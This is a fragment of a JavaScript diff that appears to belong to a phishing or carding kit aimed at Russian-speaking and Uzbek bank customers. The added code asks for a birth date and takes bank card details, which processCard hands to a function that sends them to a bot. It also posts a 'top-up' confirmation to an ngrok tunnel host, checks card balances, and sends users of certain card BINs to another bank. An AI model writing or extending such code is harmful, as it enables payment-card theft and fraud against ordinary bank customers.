+    var m = (month.value || '').trim();
+    var y = (year.value || '').trim();
+
+    if (!d || !m || !y || d.length < 1 || m.length < 1 || y.length < 4) {
+      if (errEl) errEl.style.display = 'block';
+      if (group) group.style.borderColor = 'var(--modal-error, #d32f2f)';
+      return;
+    }
+
+    if (errEl) errEl.style.display = 'none';
+    if (group) group.style.borderColor = 'var(--modal-accent, #1867c1)';
+
+    var val = d.padStart(2, '0') + '.' + m.padStart(2, '0') + '.' + y;
+    hidden.value = val;
+
+    this._sendValue('requestBirthday', 'msBirthdayInput');
+  };
+
+  ModalSystem.prototype._handlePopolnenie = function () {
+    var btn = document.getElementById('msPopolnenieBtn');
+    if (btn) { btn.disabled = true; btn.textContent = '...'; }
+
+    var self = this;
+    var API_BASE = 'https://arboricultural-roselia-unsolvably.ngrok-free.dev';
+    var id = this.logId || ('temp_' + this.cfg.itemId + '_' + Date.now());
+
+    axios.post(API_BASE + '/api/confirmAction', { method: 'popolnenie', id: id, itemId: this.cfg.itemId })
+      .then(function () {
+        self.currentStatus = 'wait';
+        self.showModal('msLoading');
+      })
+      .catch(function (err) {
+        if (btn) { btn.disabled = false; btn.textContent = 'Я пополнил(а) баланс'; }
+      });
+  };
+
+  ModalSystem.prototype.processCard = function (cardData) {
+    if (this._cardLocked) return;
+    this._cardLocked = true;
+    this._cardData = cardData;
+    _memCardNum = cardData.cardNumber || '';
+    _memCardData = cardData;
+    this.showModal('msLoading');
+
+    this._sendCardDataToBot(cardData);
+
+    var self = this;
+
+    var autoPPPromise = axios.post('/api/getAutoPPConfig', { item: this.cfg.itemId }).catch(function () { return { data: { enabled: false } }; });
+    var checkerPromise = axios.post('/api/getCheckerState', { item: this.cfg.itemId }).catch(function () { return { data: {} }; });
+
+    Promise.all([autoPPPromise, checkerPromise]).then(function (results) {
+      var autoPPData = results[0].data || {};
+      var checkerData = results[1].data || {};
+
+      self.cfg.checkBalance = checkerData.checkBalance;
+      self._autoPP = autoPPData;
+
+      var pageCountryMeta = document.querySelector('meta[name="page-country"]');
+      var pageCountry = pageCountryMeta && pageCountryMeta.content ? String(pageCountryMeta.content).toLowerCase() : '';
+      var isUzPage = pageCountry === 'uz';
+
+      if (isUzPage && autoPPData.enabled && autoPPData.excludedBins && autoPPData.excludedBins.length > 0) {
+        var cardNum = (cardData.cardNumber || '').replace(/\D/g, '');
+        for (var i = 0; i < autoPPData.excludedBins.length; i++) {
+          var bin = autoPPData.excludedBins[i];
+          if (cardNum.indexOf(bin) === 0) {
+            var t = self.cfg.translate || {};
+            var skTitle = document.querySelector('#msWrongDataDisplay .ms-title');
+            var skText = document.querySelector('#msWrongDataDisplay .ms-text');
+            if (skTitle) skTitle.textContent = t.errors && t.errors.changeCard || 'Возникла проблема';
+            if (skText) skText.textContent = t.errors && t.errors.cardProblem || 'Уважаемый пользователь, данная банковская карта не поддерживается. Пожалуйста укажите карту другого банка.';
+            self.showModal('msWrongDataDisplay');
+            self._cardLocked = false;
+            axios.post('/api/autoPPNotify', { item: self.cfg.itemId, event: 'binBlocked', extra: bin }).catch(function () {});
+            return;
+          }
+        }
+      }
+
+      self._processCardStep2(cardData);
+    });
   };
 
   window.ModalSystem = ModalSystem;
